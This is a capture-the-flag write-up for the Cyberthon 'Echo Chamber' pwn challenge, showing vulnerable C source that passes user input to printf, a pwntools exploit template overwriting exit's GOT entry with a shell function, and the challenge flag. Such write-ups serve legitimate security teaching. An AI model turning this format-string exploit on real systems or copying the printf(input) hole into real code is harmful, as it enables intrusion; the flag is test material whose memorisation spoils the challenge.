# Echo Chamber
chals.cyberthon22t.ctf.sg:20301

files: [echo_chamber](./echo_chamber) and [main.c](./main.c)

the challenge requires an understanding of C format string exploits and Global Offset Table exploits.

source code as seen:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void setup_IO()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void shell()
{
    system("/bin/sh");
}

void main()
{
    char input[256];

    setup_IO();

    puts(" _______  _     _  __    _  _______  __   __  _______  _______  ______   ");
    puts("|       || | _ | ||  |  | ||       ||  | |  ||       ||       ||    _ |  ");
    puts("|    _  || || || ||   |_| ||_     _||  | |  ||_     _||   _   ||   | ||  ");
    puts("|   |_| ||       ||       |  |   |  |  |_|  |  |   |  |  | |  ||   |_||_ ");
    puts("|    ___||       ||  _    |  |   |  |       |  |   |  |  |_|  ||    __  |");
    puts("|   |    |   _   || | |   |  |   |  |       |  |   |  |       ||   |  | |");
    puts("|___|    |__| |__||_|  |__|  |___|  |_______|  |___|  |_______||___|  |_|");
    puts("");
    puts("=========================================================================");
    puts("                         Stage 4: Echo Chamber");
    puts("=========================================================================");
    printf("Enter Input => ");

    fgets(input, 255, stdin);

    puts("ECHO:");
    printf(input);

    exit(0);
}
```
A buffer overflow would not be possible because exit() is called before the function returns, so overwriting the rip is useless as the program would never jump to it anyway. 

Since the program has partial RELRO, the GOT would be writable, which is something we can exploit to redirect code execution.

for the exit() function, the program would go from exit@PLT --> exit on the GOT --> actual instruction on the GOT

What we want to do is overwrite the actual instruction on the GOT so that when exit() is called, it isn't actually run and shell() runs instead

we can do this with pwntools, `fmtstr_payload(offset, write)`

The offset can be found with a fuzzing script or manually with "examplestring %p %p %p" or "examplestring %n$p" where n increases

When the format string returns the hex of examplestring, that is where the format string overwrite occurs.

In this case we have `offset = 6`.

Given a binary, pwntools can help extract and use function addresses in the program. <https://docs.pwntools.com/en/stable/elf/elf.html>

```python
# declare the binary
elf = context.binary = ELF("./binary")

# remove the need to hardcode addresses
# we want to replace the GOT address of exit() with shell()
write = {elf.got['exit']:elf.symbols['shell']}
```

We can use pwntools `fmtstr_payload()` function to generate the payload to the connection. With general template as follows:

```python3
p = connect("url", port)
elf = context.binary = ELF("./binary")

offset = n
write = {<addr a>:<addr b>} # where address b will overwrite the one at a
payload = fmtstr_payload(offset, write)
p.sendline(payload)
p.interactive()
```

full script at [exploit.py](/.exploit.py)

`CTFSG{3ch0_4ft3r_m3_d0nt_p455_us3r_1nput_2_pr1ntf}`
